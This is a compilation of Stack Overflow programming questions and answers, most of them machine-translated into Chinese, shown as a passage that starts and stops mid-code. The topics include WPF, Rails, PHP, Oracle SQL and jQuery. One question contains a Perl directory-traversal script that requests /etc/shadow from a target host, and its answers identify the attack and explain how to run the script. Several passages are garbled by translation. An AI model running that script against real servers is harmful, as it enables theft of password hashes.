        var _X = touchPoint.X - (circleSize.Width / 2d);
        var _Y = circleSize.Height - touchPoint.Y - (circleSize.Height / 2d);
        var _Hypot = Math.Sqrt(_X * _X + _Y * _Y);
        var _Value = Math.Asin(_Y / _Hypot) * 180 / Math.PI;
        var _Quadrant = (_X >= 0) ?
            (_Y >= 0) ? Quadrants.ne : Quadrants.se :
            (_Y >= 0) ? Quadrants.nw : Quadrants.sw;
        switch (_Quadrant)
        {
            case Quadrants.ne: _Value = 090 - _Value; break;
            case Quadrants.nw: _Value = 270 + _Value; break;
            case Quadrants.se: _Value = 090 - _Value; break;
            case Quadrants.sw: _Value = 270 + _Value; break;
        }
        return _Value;
    }

    public event PropertyChangedEventHandler PropertyChanged;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-24T08:09:04.863

1.  在 WPF 中，您可以使用 IsManipulationEnabled="true" 来启用操作。不需要像 Windows 商店应用那样使用 ManipulationMode="All"。
2.  您可以尝试 Mouse.GetPosition(this) 获取当前鼠标位置

# ruby-on-rails - 使用 ActiveSupport 时的 LoadError 问题

> ID：14220061
> 
> 赞同：3
> 
> 时间：2013-01-08T16:53:12.483
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3.1

`load_missing_constant`使用关注点时出现错误。只有当我开始 rake 任务时。Rails 服务器/控制台正常启动。

```
# app/models/journey.rb
class Journey < CouchRest::Model::Base
  include Searchable
end

# app/models/concerns/journey/payable.rb
module Journey::Payable
  extend ActiveSupport::Concern

  module ClassMethods
    def search
      true
    end
  end
end

#application.rb
config.autoload_paths += %W( #{config.root}/lib #{config.root}/app/models/concerns ) 
```

错误

> /Users/user/.rvm/gems/ruby-1.9.3-p194@project/gems/activesupport-3.1.8/lib/active_support/dependencies.rb:490:in `load_missing_constant': 预期 /Users/user/code /project/app/models/concerns/journey/payable.rb 定义 Journey::Payable (LoadError)

# php - 在 jquery $.post 或等效项中从 PHP 获取响应

> ID：14220064
> 
> 赞同：0
> 
> 时间：2013-01-08T16:53:18.403
> 
> 标签：php, jquery, ajax

我正在向我的 php 方法发送 JQUERY $.post 请求，它看起来像这样：

```
$.post("/controller/method/",{id: cell_id},function(data,status,xhr)
{
         some_javascript_function();
}) 
```

PHP：

```
public function method()
{
   insert to database code...
} 
```

我的 PHP 函数只是在表中插入一条记录， some_javascript_function() 将使用它 - 导致它从数据库请求数据。有时我的 PHP 函数太慢，无法在 some_js_function() 尝试从数据库中获取记录之前插入记录。

当一切准备就绪时，我可以管理来自 PHP 的一些响应，然后调用 some_js_function 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T16:55:47.087

写入返回后开始读取。`$.post`有一个回调函数，当你保证写入已经完成时。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:03:20.963

您要做的是在插入完成后从 PHP 函数返回数据。它看起来像下面。

```
function store()
{
    //your code......

    //let's assume that store function will do the data storing part.

    $state = store(); // you should return true after the data insertion is successful

    if($state)
     echo $data; // here we echo data to used in the callback function.
} 
```

回调函数在当前效果100%完成后执行。

# php - PHP/IIS 相关包括混淆

> ID：14220066
> 
> 赞同：1
> 
> 时间：2013-01-08T16:53:24.553
> 
> 标签：php, sql, sql-server-2005, iis-6

我想知道这种设置是否可行，因为我在设置时遇到了很多麻烦。我正在尝试建立一个具有如下文件结构的网站：

*   **项目1**（文件夹）
    *   索引.php
    *   样式.css
    *   包含.php
        *   **管理员**（文件夹）
            *   索引.php

父“project1”文件夹位于 D:\Projects\project1 中的“server1”上。

该网站通过虚拟目录“ [http://server1/project1](http://server1/project1) ”访问。

我希望能够以“/style.css”格式编写包含、图像 src、样式表等的所有路径，以便无论在哪里都可以找到这些文件。例如，无论是放在“project1”文件夹还是“admin”文件夹中，以下链接都应该可以工作：

```
<link rel="stylesheet" type="text/css" href="/style.css"> 
```

**编辑：**正如[mellamokb 所](https://stackoverflow.com/users/116614/mellamokb)建议的，使用 href="/project1/style.css" 似乎适用于两个 'index.php' 文件。但是我似乎无法为 PHP INCLUDE 找到类似的解决方案。

如果我用这个...

```
<?php include_once '/include.php'; ?> 
```

...在两个 index.php 文件中，*admin*目录中的文件都找不到该文件。

我希望**$_SERVER['DOCUMENT_ROOT']**返回 "D:\Projects\project1" 但它返回 D:\staging 我不知道为什么。我尝试了几种设置项目“root”的不同方法，但我最终让自己更加困惑！项目的虚拟根目录应该是“ [http://server1/project1](http://server1/project1) ”，物理根目录应该是 D:\Projects\project1，但我不知道如何强制执行此操作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:42:46.637

您可以创建一个包含常量的文件并因此拥有一些东西`define('BASE_URL', "http://server1/project1/")`。然后你可以使用常量变量相对地工作`BASE_URL`，

```
<link rel="stylesheet" type="text/css" href="<?php echo BASE_URL; ?>style.css"> 
```

您还可以通过附加“相对”地址来处理其他文件。

```
include (BASE_URL . '<file you want to add>'); 
```

# magento-1.7 - Magento 单页结帐：继续按钮在 magento 1.7 中不起作用。

> ID：14220068
> 
> 赞同：0
> 
> 时间：2013-01-08T16:53:41.230
> 
> 标签：magento-1.7

选择付款方式后，magento 1.7 onepage checkout 卡住了。我找到了一些解决方案，但没有一个有效。我真的不想弄乱 .js 文件，除非它是一个适当的修复。几天前似乎工作正常。从那以后没有安装任何扩展。

Weinwerk Klimascout：[点击这里查看网站。](http://www.weinwerk-klimascout.de)
提前致谢！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-27T13:56:27.010

所以我遇到了同样的问题（也是1.7.0.2）。在我添加了一些自定义模块后，它潜入了。

经过一天左右的尝试几乎所有我能想到的，我找到了一个相当简单的解决方案：我不小心从“skin\frontend\base\default”目录中删除了一些目录

特别是，检查以确保“default\js”目录中的文件没有问题。“opcheckout.js”文件控制单页结账的推进过程。

我最终重新安装了所有子目录“skin\frontend\base\default”，这就成功了。

（只是为了确认，一旦修复，将文件重命名为 opcheckout.js.bak 并且继续按钮将恢复为无工作状态）。

我确信这个错误还有很多其他可能的原因。jquery.noconflict() 和 billing.phtml 值得一看。对于可能不熟悉 magento 的其他人来说，这里的调试步骤是救命稻草。

[https://magento.stackexchange.com/questions/428/fundamentals-for-debugging-a-magento-store](https://magento.stackexchange.com/questions/428/fundamentals-for-debugging-a-magento-store)

# c# - 从另一个目录中保存/复制文件

> ID：14220074
> 
> 赞同：0
> 
> 时间：2013-01-08T16:53:50.357
> 
> 标签：c#, asp.net-mvc-4

使用：asp .net mvc 4.0、c#、vs10

**strFilePath**保存目录中现有文件的路径。我想将文件**保存****/复制**到我的应用程序的**上传**目录中。

 ****我怎么能这样做。我正在尝试一些愚蠢的事情，并在互联网上搜索并感到无助。

```
string filePath = "foo.txt";
//var path = Path.Combine(Server.MapPath("~/Uploads"), filePath);
if (System.IO.File.Exists(filePath))
{
    System.IO.File.Copy(filePath, "~/Uploads");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T18:38:59.680

`~`[File.Copy](http://msdn.microsoft.com/en-us/library/9706cfs5.aspx)无法识别符号

首先将虚拟路径转换为物理路径，然后进行复制。

```
System.IO.File.Copy(filePath, Server.MapPath("~/Uploads")); 
```

此外，您需要对要复制的文件夹的权限。如果上述方法不起作用，您可能需要[模拟。](https://stackoverflow.com/a/7811222/649524)****

# oracle - Oracle 自联接检索数据

> ID：14220078
> 
> 赞同：-1
> 
> 时间：2013-01-08T16:54:12.037
> 
> 标签：oracle, plsql

**员工A**：

```
E_no  E_name   E_Ag_ref  E_Type  Status          E_Entry_Date
----------------------------------------------------------------    
1B    Mike     12345       B     Continued   08/01/2013 12:24:20
1S   steve     12345       S     Continued   08/01/2013 12:25:20
2B   Radek     1001        B     Continued   08/01/2013 16:24:20
2S   Rafal     1001        S     nContinued  06/01/2014 20:24:20 
```

**询问：**

```
select * 
from 
    Employee E1,
    Employee E2 
where 
    ((substr(E1.E_no,1,length(E1.E_no)-1) || 'S')=E2.E_no and E2.E_Type='S' )
    and ( ( TO_CHAR(E1.E_Entry_Date,'YYYYMMDD HH24:MI:SS') )  between ((:startDate)||' '|| (:startTime)) and  ((:endDate)||' '||(:endTime)) OR ('ALL'  between (:startTime) and (:endTime))  )
    and ( ( TO_CHAR(E2.E_Entry_Date,'YYYYMMDD HH24:MI:SS') )  between ((:startDate)||' '|| (:startTime)) and  ((:endDate)||' '||(:endTime)) OR ('ALL'  between (:startTime) and (:endTime))  )
    and E2.E_Type='B' and E1.status='Continued' and E2.status='Continued' 
```

上面的查询返回以下 3 条记录。

```
1B    Mike     12345       B     Continued   08/01/2013 12:24:20
1S   steve     12345       S     Continued   08/01/2013 12:25:20
2B   Radek     1001        B     Continued   08/01/2013 16:24:20 
```

**输入参数：**

```
startDate:06/01/2012
endDate:  08/01/2013

startTime: 13:00:00
endTIme:   21:00:00 
```

**预期结果：**

```
1B    Mike     12345       B     Continued   08/01/2013 12:24:20 
```

请任何人建议，如何解决这个问题。

问候， Komaturi

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:50:53.797

我认为您正在尝试这样做：

```
SQL> select e1.*
  2    from employee e1
  3         inner join employee e2
  4                 on substr(e1.e_no, 1, length(e1.e_no)-1) || 'S' = e2.e_no
  5   where e1.E_Type = 'B'
  6     and e2.E_Type = 'S'
  7     and e1.status='Continued'
  8     and e2.status='Continued'
  9     and (  '' = 'ALL' -- set the left side to ALL if you don't want to compare dates.
 10          or (e1.E_Entry_Date between to_date('06/01/2012 13:00:00', 'dd/mm/yyyy hh24:mi:ss')
 11                                  and to_date('08/01/2013 21:00:00', 'dd/mm/yyyy hh24:mi:ss')
 12              and e2.E_Entry_Date between to_date('06/01/2012 13:00:00', 'dd/mm/yyyy hh24:mi:ss')
 13                                      and to_date('08/01/2013 21:00:00', 'dd/mm/yyyy hh24:mi:ss'))
 14         );

E_ E_NAME       E_AG_REF E STATUS     E_ENTRY_DATE
-- ---------- ---------- - ---------- -------------------
1B Mike            12345 B Continued  08/01/2013 12:24:20 
```

您的原始 SQL 不能是您实际运行的。即使我们掩盖了日期到字符转换的东西，你也有

```
 E2.E_Type='S'
AND E2.E_Type='B' 
```

这不可能是真的（这些根本不是 OR'd）。你可能是`E1.e_type = 'B'`说我猜。

# jquery - 为 replaceWith() 定位两个元素

> ID：14220080
> 
> 赞同：0
> 
> 时间：2013-01-08T16:54:15.927
> 
> 标签：jquery, jquery-selectors

我想用相同的文本字符替换两个服务器端生成的图像。是否可以在同一行 jQuery 中定位两个元素，如下所示：

```
$('img.first','img.firstDisabled').replaceWith('&laquo;'); 
```

我已经在我的代码中尝试过，但它似乎不起作用，所以在这一点上，我只是想知道这是否可能并且我一直做错了，或者我只是在吠叫错误的树.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T16:55:16.730

逗号需要在单个选择器字符串中，而不是分隔两个字符串：

```
$('img.first, img.firstDisabled').replaceWith('&laquo;'); 
```

将其拆分为两个选择器字符串意味着在选择器 2 的上下文中找到选择器 1，这在您的问题的上下文中当然没有意义，因为您无法`img`在`img`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T16:55:26.107

尝试`$('img.first, img.firstDisabled').replaceWith('&laquo;');`

请参阅有关多个选择器的[Jquery 文档。](http://api.jquery.com/multiple-selector/)

# c# - Linq Sql Query using Starts With lat/long

> ID：14220085
> 
> 赞同：2
> 
> 时间：2013-01-08T16:54:19.623
> 
> 标签：c#, linq-to-sql

I have a Latitude Column in the db that has values that look like this `41.230524` , using HTML5 geolocation I get a more accurate Latitude that will look like this `41.230524081`

I want to find the row in my db that is closest to the Latitude returned from Geolocation. I was thinking something like

```
var myCity = db.zipcodes.Where(x => LatFromGeoCode.StartsWith(x.Latitude)).FirstOrDefault(); 
```

the problem with that is there may be different cities in the db that start with 41.2XXXXX , I don't just want the first one , I want the closest match

I was thinking maybe a loop first trying to match the full LatFromGeo, then -1 char , then try again , it seems there must be a better way

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:03:00.427

Find the one with the smallest mathematical difference:

```
double minDiff = db.zipcodes.Min(x => Math.Abs(x.Latitude - LatFromGeoCode));
var myCity = db.zipcodes.Where(x => Math.Abs(x.Latitude - LatFromGeoCode) == minDiff).FirstOrDefault(); 
```

(There is a way better way to do this with compression syntax, but I don't know linq to sql well enough to write it out quickly)

Here's the SQL if someone wants to convert it:

```
SELECT TOP 1 zipcode
FROM zipcodes z
WHERE ABS(z.Latitude - @LatFromGeoCode) = MIN(ABS(z.Latitude - @LatFromGeoCode)) 
```

# javascript - grunt 插件如何包装另一个插件

> ID：14220087
> 
> 赞同：4
> 
> 时间：2013-01-08T16:54:20.343
> 
> 标签：javascript, node.js, gruntjs

我想知道 Grunt 插件如何包裹另一个插件。

例如，一个插件可以设置一些参数并在运行另一个 Grunt 任务时传递它们。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T20:54:14.440

请参阅[如何跨多个任务共享参数？](http://gruntjs.com/frequently-asked-questions#how-can-i-share-parameters-across-multiple-tasks)在文档中。

# asp.net - Oracle CLOB 和 NCLOB 需要偶数字节

> ID：14220089
> 
> 赞同：0
> 
> 时间：2013-01-08T16:54:26.077
> 
> 标签：asp.net, oracle11g, clob

Asp.Net 4、C#、Oracle 11g

嗨，我正在尝试将 html 文件的内容保存到 Oracle CLOB 列。html 文件通过 asp:Upload 按钮上传到服务器。它大部分时间都工作正常，问题是有时按钮的 FileContent 属性处的流具有奇数字节，并且 clob 列的 Write 方法抛出异常，说明它需要偶数字节数

我怎么解决这个问题？？？有什么办法可以让我的 html 文件的字节数为偶数？？？Html 文件被编码为 UTF8，更改编码确实会修改字节数，但它们仍然是偶数

提前致谢

**编辑：现在，在流长度为奇数的情况下，我只是将缓冲区的大小增加 1，然后以自己的长度将流写入缓冲区，从而默认最后一个字节缓冲。请就这样做的任何潜在错误提出建议：**

 **`var buffer = new byte[(stream.Length % 2 > 0? stream.Length + 1: stream.Length)];
stream.Read(buffer, 0, (int)stream.Length);
clob.Write(buffer, 0, buffer.Length);`** 

**再次感谢**

**编辑：以前的解决方案不起作用。新方法包括将流传递给字符串，在字符串末尾添加一个空格，然后再次转换为流。到目前为止它工作正常。抱歉，我无法发布代码...只是我无法弄清楚如何克服 StackOverflow 中代码的 4 个空格的政策**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T19:02:52.943

我假设您正在使用这些`System.Data.OracleClient`类（而不是 Oracle 的 ODP.NET）。

该类`OracleLob`没有编写字符串的方法，我希望它可以处理 CLOB。相反，文档说：

> Oracle 的 .NET Framework 数据提供程序将所有 CLOB 和 NCLOB 数据处理为 Unicode。因此，在访问 CLOB 和 NCLOB 数据类型时，您总是在处理字节数，其中每个字符为 2 个字节。例如，如果包含三个字符的文本字符串在字符集为每个字符 4 个字节的 Oracle 服务器上保存为 NCLOB，并且您执行写入操作，则将字符串的长度指定为 6 个字节，尽管它在服务器上存储为 12 个字节。

在此上下文中，*Unicode*表示 UTF-16 编码，它要求大多数字符需要 2 个字节，辅助平面中的字符需要 4 或 6 个字节。

因此，如果您有一个字符串，则必须先将其转换为 UTF-16：

```
byte[] utf16Bytes = Encoding.Unicode.GetBytes(str);
clob.Write(utf16Bytes, 0, utf16Bytes.Lenght); 
```

或者您可以使用 a`StreamWriter`来实现相同的目的：

```
OracleLob clob = ...
using (StreamWriter writer = new StreamWriter(clob, Encoding.Unicode))
{
    writer.Write(str);
} 
```

如果您的数据是 UTF-8 编码的字节数组，那么您必须将其转换为 UTF-16：

```
byte[] utf8Data = ...
byte[] utf16Data = Encoding.Convert(Encoding.UTF8, Encoding.Unicode, utf8Data);
clob.Write(utf16Data, 0, utf16Data.Length); 
```

# macos - 需要使用微调器在 max 上显示一个繁忙的窗口

> ID：14220095
> 
> 赞同：0
> 
> 时间：2013-01-08T16:54:43.627
> 
> 标签：macos, nsalert, nsprogressindicator

我是一名新的 Mac 程序员，正在编写我的第一个 mac 应用程序，实际上是将现有的 iOS 应用程序移植到 MAC。

该应用程序进行了大量的远程通信，因此当用户启动操作时，我想显示一个繁忙的窗口（或消息框，或者可能是 NSAlert），直到操作完成，然后以编程方式将其关闭，或者用户可以单击取消以停止它。

忙碌窗口会阻止用户在该操作完成之前执行任何操作。

繁忙的窗口应该有一个进度微调器、一些文本和一个取消按钮。

这是一件如此简单的事情，但我遇到了问题，因为我真的不了解 MAC 编程，让自己感到沮丧。

任何人都可以提供建议，或者已经为它编写了代码。我希望一些代码已经存在，因为我不敢相信我是世界上唯一需要这种忙碌窗口的人。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:04:04.567

你的意思是这样的：

[http://www.developers-life.com/example-nspanel-with-nsprogressindicator.html](http://www.developers-life.com/example-nspanel-with-nsprogressindicator.html)

？？？

源代码也可用（文章末尾的链接）。

您可以在 Xcode 中修改 NSPanel 并添加一个“取消”按钮，您可以将其连接到您的取消操作。

# mysql - 如何在 MySQL 中转储单个视图语句

> ID：14220098
> 
> 赞同：0
> 
> 时间：2013-01-08T16:54:48.837
> 
> 标签：mysql, views, mysqldump

我希望能够从 MySQL 数据库（版本 5.5.28）中转储单个视图语句/定义，以便我可以编辑它们并将它们插入到新数据库中。我一直在尝试使用 MySQL Workbench（OSX 上的 5.2.44 版）来做到这一点，但它将视图转储为没有视图逻辑的“CREATE Table”语句。

我正在寻找一些东西来分析数据库，为要转储的视图提供选项，并将“CREATE VIEW ...”语句转储到文件中以重新创建这些视图。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T16:59:17.217

MySQL 有一条[`SHOW CREATE VIEW`](http://dev.mysql.com/doc/refman/5.1/en/show-create-view.html)语句可以满足您的需求。

示例用法，假设您查看的名称是`sampleView`：

```
SHOW CREATE VIEW sampleView; 
```

请注意，您的用户将需要*和*权限才能使用该命令。[`SHOW VIEW`](http://dev.mysql.com/doc/refman/5.1/en/privileges-provided.html#priv_show-view) *[`SELECT`](http://dev.mysql.com/doc/refman/5.1/en/privileges-provided.html#priv_select)`SHOW CREATE VIEW`*

 *另一种方法是，您也可以从[`information_schema.VIEWS`](http://dev.mysql.com/doc/refman/5.1/en/views-table.html)表中获取此信息。

再次使用该`sampleView`名称，查询将类似于：

```
SELECT
    VIEW_DEFINITION
FROM
    INFORMATION_SCHEMA.VIEWS
WHERE
    TABLE_NAME = 'sampleView'; 
```*

# javascript - Firefox：下拉菜单 (元素）当父 div 使用 transform3d 转换时不注册“更改”事件？总而言之，我遇到了一些看起来像 Firefox 中的错误的东西。我有一个包含 SELECT 元素的 DIV 元素：<select id="ddm"><option value="a">AAA</option> <option value="b">BBB< /option> & ID：14220101 赞同：2 时间：2013-01-08T16:54:53.067 标签：javascript, jquery, firefox, css, css-transitions 回答 #1 赞同：1 时间：2014-10-04T06:45:43.183 这对我有用 $('#ddm').change(function (e) { alert ('Select changed!'); }).on("keyup",function(e) { $(this).trigger("change"); }); 回答 #2 赞同：0 时间：2013-01-29T13:09:04.453 不幸的是 - 这是 Firefox 中的一个错误： https://bugzilla.mozilla.org/show_bug.cgi?id=827890#c2 所以 - 就目前而言 - 看起来不会有答案。</option></select>

# c# - doPostBack 后未进行 ajax 调用

> ID：14220106
> 
> 赞同：0
> 
> 时间：2013-01-08T16:55:03.337
> 
> 标签：c#, javascript, jquery, asp.net

我正在让用户在锚标记单击时下载文件。在其 onclick 事件中，我使用 __doPostBack 部分回发页面以返回用户可下载的文件。

现在我面临的问题是，当找不到文件时，页面重新加载并且没有设置 ajax 调用。因此，简而言之，当浏览器在 _doPostBack 函数之后期待响应但没有得到响应时，它会重新加载页面但 $.ajax 方法不会运行。我错过了什么？我应该对响应做些什么吗？或者有什么办法可以取消响应？请帮忙。

例如，锚标签是

```
<a onclick="javascript:__doPostBack('AnnouncementAttachmentDownload','Ch 7 -Software Design2010.doc')">Ch 7 -Software Design2010.doc</a> 
```

服务器端代码是

```
protected void Page_Load(object sender, EventArgs e)
{
    SetPageTitles(ModuleNames.NotSpecified, null, false, true, true, false);
    if (this.Request.Params["__EVENTTARGET"] == "AnnouncementAttachmentDownload")
    {
    string FileName = this.Request.Params["__EVENTARGUMENT"].ToString();
        string destinationPath = Server.MapPath("~/" + System.Web.Configuration.WebConfigurationManager.AppSettings["AnnouncementAttachmentsPath"]).ToString() + "\\";
        if (System.IO.File.Exists(destinationPath + FileName))
        {
            Response.AppendHeader("content-disposition", "attachment; filename=" + FileName);
            Response.TransmitFile(destinationPath + FileName);
            Response.End();
        }
        else
        {
            ClientScript.RegisterClientScriptBlock(this.GetType(), "NewScript", "alert('The requested file could not be found, please contact portal.production.support');", true);\\DOESNT WORK
        }

    }
} 
```

else 部分中的行，它只显示消息，但页面也会在此之后加载。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-09T06:54:09.013

在找不到文件时，我使用 Responce.Redirect 再次将其重定向到当前页面，在此之前我将 bool 存储在会话变量中，并在页面加载时检查会话变量是否包含某些值，然后显示消息. 另外，我在上面的 if 表达式中也清除了会话。

# programming-languages - 那是什么样的代码？

> ID：14220107
> 
> 赞同：0
> 
> 时间：2013-01-08T16:55:04.260
> 
> 标签：programming-languages

我这里有一个代码，但我不知道它是用什么语言编写的，以及如何运行它。

```
use LWP::UserAgent;
$host = $ARGV[0];
chomp($host);
if($host !~ /http:\/\//) { $host = "http://$host"; };

my $ua = LWP::UserAgent->new;
$ua->timeout(30);
$lfi = "/help/../../../../../../../../etc/shadow";
$url = $host.$lfi;
$request = HTTP::Request->new('GET', $url); $response =
$ua->request($request); my $html = $response->content; if($html =~ /root/) {
print "root$' \n" ; } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T16:56:41.530

对我来说看起来像 Perl。你试过了吗

`perl thefile?`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:02:22.837

确定的 Perl。这是一个简单的脚本来“测试”网络服务器对目录遍历攻击： [https ://en.wikipedia.org/wiki/Directory_traversal_attack](https://en.wikipedia.org/wiki/Directory_traversal_attack)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T16:57:25.600

它看起来像 Perl。

在顶部添加一行：

```
#!/usr/bin/perl -w 
```

然后`chmod +x`你就可以像运行任何程序一样运行它。

编辑：如果你在 Windows 上，你会想检查[http://strawberryperl.com/](http://strawberryperl.com/)

# iphone - 两个 UITextview 之间的动画

> ID：14220108
> 
> 赞同：0
> 
> 时间：2013-01-08T16:55:08.043
> 
> 标签：iphone, ios6

```
[baseview addSubview:textView1];
textView1.alpha = 0.0;
[UIView beginAnimations:nil context:NULL];
[UIView setAnimationDuration:1];
[UIView setAnimationTransition:UIViewAnimationTransitionCurlDown forView:textView1 cache:YES];
textView1.alpha = 1.0;
[UIView commitAnimations];

[baseview addSubview:textView2];
textView2.alpha = 0.0;
[UIView beginAnimations:nil context:NULL];
[UIView setAnimationDuration:1];
[UIView setAnimationTransition:UIViewAnimationTransitionCurlDown forView:textView2 cache:YES];
textView2.alpha = 1.0;
[UIView commitAnimations]; 
```

我如何在这两个文本视图之间制作动画。

感谢帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:00:50.633

这应该可以隐藏第一个文本视图并显示第二个：

```
[UIView beginAnimations:nil context:NULL];
[UIView setAnimationDuration:1];
[UIView setAnimationTransition:UIViewAnimationTransitionCurlDown forView:textView1 cache:YES];
{
    textView1.alpha = 0.0;
    textView2.alpha = 1.0;
}
[UIView commitAnimations]; 
```

也许您必须将父视图设置为动画视图（例如`self.view`）。

# php - 运行 php 5.4.10 时库不兼容

> ID：14220112
> 
> 赞同：1
> 
> 时间：2013-01-08T16:55:19.010
> 
> 标签：php

目前我的系统上有两个 php 版本，内置 5.3 和自制版本 5.4。通过自制软件安装 imagemagick 后一切都很好，每次我在终端上输入 php 关键字时，php 5.4 都被破坏了。

错误画面：

```
dyld: Library not loaded: /usr/local/lib/libfreetype.6.dylib
Referenced from: /usr/local/bin/php
Reason: Incompatible library version: php requires version 16.0.0 or later, but libfreetype.6.dylib provides version 13.0.0 
```

php 5.4 位于`/usr/local/Cellar/php54/5.4.10`

知道如何解决吗？谢谢

# dns - 子域指向问题

> ID：14220118
> 
> 赞同：0
> 
> 时间：2013-01-08T16:55:39.553
> 
> 标签：dns, subdomain, blogs

好的，这就是事情。我有一个 Big Commerce 商店和一个 Fasthost 托管帐户。该域在 Fasthost 注册。名称服务器指向 Big Commerce 商店。该商店正在使用主域名（domain.com）

我正在尝试在 Fasthost 帐户上设置子域 blog.domain.com 并托管 wordpress。我正在尝试在 Big Commerce 商店中设置 DNS 设置，以将 blog.domain.com 指向博客所在的 Fasthost 帐户。这可能吗？如何正确设置？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-01-08T17:05:17.770

通常，您的 DNS 提供商应该为您提供一个界面来管理您的 DNS 记录。一旦您获得对此类接口的访问权限，您只需要添加一条`A`记录`blog.domain.com`以指向您在另一台主机上的服务器。您可能还想为*子域*`NS`添加一条记录以指向另一台主机上的名称服务器。

# javascript - 如何通过 JavaScript 分割图像？

> ID：14220125
> 
> 赞同：1
> 
> 时间：2013-01-08T16:55:51.357
> 
> 标签：javascript, slideshow

在使用 jQuery/jQueryUI 等库的幻灯片中，通常会拆分幻灯片并分散片段以使当前幻灯片消失。我很好奇用 Javascript 做到这一点的技巧。我的意思是纯 JS 来理解这个过程，而不是用可用的库来实现。

正如我在互联网上搜索的那样，通过Javascript分割图像的一种常见方法是将图像设置为背景并通过CSS显示片段，但我怀疑这是用于创建幻灯片效果的方法。

Javascript 如何分割图像/幻灯片？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:00:59.823

您可以尝试`canvas`在 HTML 5 中使用标签。您可以在画布上导入图像并从那里发挥您的魔力。我手头没有示例，但您可以自己尝试一下。

# rally - 应用程序在调试模式下按需要运行，但在 Rally 环境中崩溃

> ID：14220129
> 
> 赞同：2
> 
> 时间：2013-01-08T16:56:06.603
> 
> 标签：rally, agile-central

我创建了一个动态创建网格的应用程序，并允许用户通过“数字字段”编辑器对其中一个网格列进行更改。在调试环境中一切正常，但是当我尝试在 Rally 环境中编辑其中一个字段时，它会使应用程序崩溃。从外观上看，包含应用程序的 iframe 只是完全重新加载。

现在，这是奇怪的部分，可能是正在发生的事情的线索。在我单击应用程序的其他位置（提交更改）后，应用程序崩溃，但是如果我在应用程序的某个位置滚动鼠标滚轮，微调器会失去焦点（没有向上/向下箭头），*然后*如果我单击某个位置，则会应用编辑并且应用程序不会崩溃。再次在调试模式下，我不需要执行此操作，只需单击其他位置即可应用更改。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T20:40:59.550

这是 2.0p5 的一个已知问题，将在 SDK 的下一版本中修复。基本上，它使用大锤来响应某些内容已被编辑并刷新它的事实。由于新的 SDK 可以与消息总线通信，这完全没有必要......

同时，您应该能够通过定义一个全局 Rally.getApp 函数来修补您的应用程序，该函数返回您的应用程序实例以防止硬刷新：

```
//In your app definition give it an xtype:
Ext.define('My.App', {
    extend: 'Rally.app.App',
    //...
    alias: 'widget.myapp'
    //...
});

//Find the app instance by its xtype and return it
Rally.getApp = function() {
    return Ext.ComponentQuery.query('myapp')[0];
}; 
```

然后，您可以在 2.0p6 发布并升级后删除该代码。

# asp.net-mvc-4 - 如何验证并将整个 Viewdata 和 Hiddenfield 数据发布到 Actionmethod

> ID：14220134
> 
> 赞同：-1
> 
> 时间：2013-01-08T16:56:25.120
> 
> 标签：asp.net-mvc-4

我对 mvc 4 很陌生，嗨假设表单中有 6 个控件，其中 2 个控件是下拉菜单，其余的是文本框。我们如何将下拉列表选择的文本分配给隐藏字段，以及如何将整个表单数据传递给 Controlers 操作方法。

在发送表单数据时帮助下拉验证。

请链接/代码/建议。

问候拉贾

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T19:59:45.750

在这里阅读教程： http: [//www.asp.net/mvc/tutorials/getting-started-with-aspnet-mvc3/cs/intro-to-aspnet-mvc-3](http://www.asp.net/mvc/tutorials/getting-started-with-aspnet-mvc3/cs/intro-to-aspnet-mvc-3) for MVC3 和这里：[http:// www.asp.net/mvc/tutorials/mvc-4/getting-started-with-aspnet-mvc4/intro-to-aspnet-mvc-4](http://www.asp.net/mvc/tutorials/mvc-4/getting-started-with-aspnet-mvc4/intro-to-aspnet-mvc-4) for MVC4

# vba - 使用 VBA 在 Word 中更改除一张以外的所有表格的颜色

> ID：14220139
> 
> 赞同：2
> 
> 时间：2013-01-08T16:56:31.357
> 
> 标签：vba, ms-word, ms-office

我有一个宏，用于删除某些 Word 文档中所有表格中的所有颜色。被删除的颜色最初是为了指示某人应该在哪里输入。

相信我，我宁愿使用表单域或 ActiveX 文本框，但这不是它们可以工作的情况，因为 Word 是通过第 3 方应用程序打开的，该应用程序通过邮件合并使这些应用程序无效。无论如何，我想跳过第一张桌子。我设置了下面的代码来执行此操作，然后将第一个表格的第一个单元格更改回特定颜色。

```
Sub decolordocument()
'
' decolordocument Macro
'
'
Dim tbl As Table

For Each tbl In ActiveDocument.Tables
tbl.Shading.BackgroundPatternColor = wdColorWhite
Next
ActiveDocument.Tables(1).Cell(1, 1).Shading.BackgroundPatternColor = wdColorLightTurquoise

End Sub 
```

这可以很好地去除颜色，但第一个表格的第一个单元格的颜色在所有表格中都不相同。我只想在 for each 循环期间跳过第一个表。我尝试了一个 if 语句（If tbl = ActiveDocument.Tables(1) Then...），但显然这不是允许的比较，因为它无法识别 Then 语句。我也试过用一个范围来做这个，但不能完全正确。任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:11:13.243

```
Sub decolordocument()
'
' decolordocument Macro
